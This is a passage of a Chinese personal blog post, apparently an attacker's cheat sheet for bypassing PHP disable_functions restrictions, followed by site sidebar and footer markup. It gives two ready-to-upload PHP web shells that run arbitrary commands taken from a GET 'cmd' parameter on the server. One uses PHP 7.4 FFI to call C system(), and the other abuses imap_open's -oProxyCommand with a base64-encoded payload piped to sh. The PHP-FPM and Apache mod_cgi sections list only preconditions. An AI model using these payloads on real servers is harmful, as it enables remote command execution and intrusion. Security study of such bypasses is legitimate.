+<h4 id="12-利用PHP7-4-FFI绕过">12.利用PHP7.4 FFI绕过</h4>
+<p>介绍:FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。<strong>简单地说，就是一项让你在PHP里能够调用C代码的技术</strong>。</p>
+<p>利用条件:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>php版本7.4及以上</p>
+</li>
+<li class="lvl-2">
+<p>FFI开启,并且ffi.enable需要设置为true</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817398.png" alt=""></p>
+</li>
+</ul>
+<p>利用代码示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#可用将这串代码上传到/tmp/然后文件包含或者直接上传到../html/直接访问</span><br><span class="line">#返回结果将会写入/tmp/pass，并在每次读出结果后用unlink()函数删除它。</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$ffi-&gt;system(&quot;$cmd &gt; /tmp/pass&quot;);       //由GET传参的任意代码执行</span><br><span class="line">echo file_get_contents(&quot;/tmp/pass&quot;);  //如果file_get_contents被禁用,就放到web目录访问</span><br><span class="line">@unlink(&quot;/tmp/pass&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="13-利用攻击PHP-FPM">13.利用攻击PHP-FPM</h4>
+<p>利用条件:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Linux 操作系统</p>
+</li>
+<li class="lvl-2">
+<p>PHP-FPM</p>
+</li>
+<li class="lvl-2">
+<p>存在可写的目录, 需要上传 .so 文件</p>
+</li>
+</ul>
+<p>利用方法:以后补充</p>
+<h4 id="14-利用-Apache-Mod-CGI">14.利用 Apache Mod CGI</h4>
+<p>利用条件:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Apache + PHP (apache 使用 apache_mod_php)</p>
+</li>
+<li class="lvl-2">
+<p>Apache 开启了 cgi, rewrite</p>
+</li>
+<li class="lvl-2">
+<p>Web 目录给了 AllowOverride 权限</p>
+</li>
+</ul>
+<p>原理介绍:</p>
+<p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p>
+<p>利用方法:遇到后补充</p>
+<h4 id="15-利用imap-open-绕过">15.利用imap_open()绕过</h4>
+<p>利用条件:需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code></p>
+<p>原理介绍:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</span><br></pre></td></tr></table></figure>
+<p>利用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#上传下面的代码到服务器,文件包含或直接访问该文件</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if (!function_exists(&#x27;imap_open&#x27;)) &#123; </span><br><span class="line">die(&quot;no imap_open function!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">$server = &quot;x -oProxyCommand=echot&quot;.base64_encode($_GET[&#x27;cmd&#x27;].&quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64t-d|sh&#125;&quot;; </span><br><span class="line">imap_open(&#x27;&#123;&#x27; . $server . &#x27;:143/imap&#125;INBOX&#x27;, &#x27;&#x27;, &#x27;&#x27;); // or</span><br><span class="line">var_dump(&quot;nnError: &quot;.imap_last_error()); </span><br><span class="line">sleep(5); </span><br><span class="line">echo file_get_contents(&quot;/tmp/cmd_result&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/" rel="prev" title="内网穿透工具使用汇总">
+      <i class="fa fa-chevron-left"></i> 内网穿透工具使用汇总
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%BB%91%E5%90%8D%E5%8D%95%E7%88%86%E7%A0%B4"><span class="nav-number">1.</span> <span class="nav-text">1.黑名单爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8iconv"><span class="nav-number">2.</span> <span class="nav-text">2.利用iconv</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">3.</span> <span class="nav-text">3.利用 LD_PRELOAD 环境变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8Windows%E7%BB%84%E4%BB%B6COM%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">4.利用Windows组件COM绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E5%88%A9%E7%94%A8-SplDoublyLinkedList-UAC"><span class="nav-number">5.</span> <span class="nav-text">5.利用 SplDoublyLinkedList UAC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8-GC-UAF"><span class="nav-number">6.</span> <span class="nav-text">6.利用 GC UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-%E5%88%A9%E7%94%A8-Json-Serializer-UAF"><span class="nav-number">7.</span> <span class="nav-text">7.利用 Json Serializer UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-%E5%88%A9%E7%94%A8Backtrace-UAF"><span class="nav-number">8.</span> <span class="nav-text">8.利用Backtrace UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-%E5%88%A9%E7%94%A8Bash-Shellshock-CVE-2014-6271-%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.</span> <span class="nav-text">9.利用Bash Shellshock(CVE-2014-6271)破壳漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-%E5%88%A9%E7%94%A8ImageMagick-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-CVE-2016%E2%80%933714"><span class="nav-number">10.</span> <span class="nav-text">10.利用ImageMagick 漏洞绕过(CVE-2016–3714)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-%E5%88%A9%E7%94%A8pcntl-exec"><span class="nav-number">11.</span> <span class="nav-text">11.利用pcntl_exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-%E5%88%A9%E7%94%A8PHP7-4-FFI%E7%BB%95%E8%BF%87"><span class="nav-number">12.</span> <span class="nav-text">12.利用PHP7.4 FFI绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BBPHP-FPM"><span class="nav-number">13.</span> <span class="nav-text">13.利用攻击PHP-FPM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#14-%E5%88%A9%E7%94%A8-Apache-Mod-CGI"><span class="nav-number">14.</span> <span class="nav-text">14.利用 Apache Mod CGI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#15-%E5%88%A9%E7%94%A8imap-open-%E7%BB%95%E8%BF%87"><span class="nav-number">15.</span> <span class="nav-text">15.利用imap_open()绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LtmThink</p>
+  <div class="site-description" itemprop="description">LtmThink的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zls1793" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zls1793" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ltmthink1793@gmail.com" title="E-Mail → mailto:ltmthink1793@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LtmThink</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
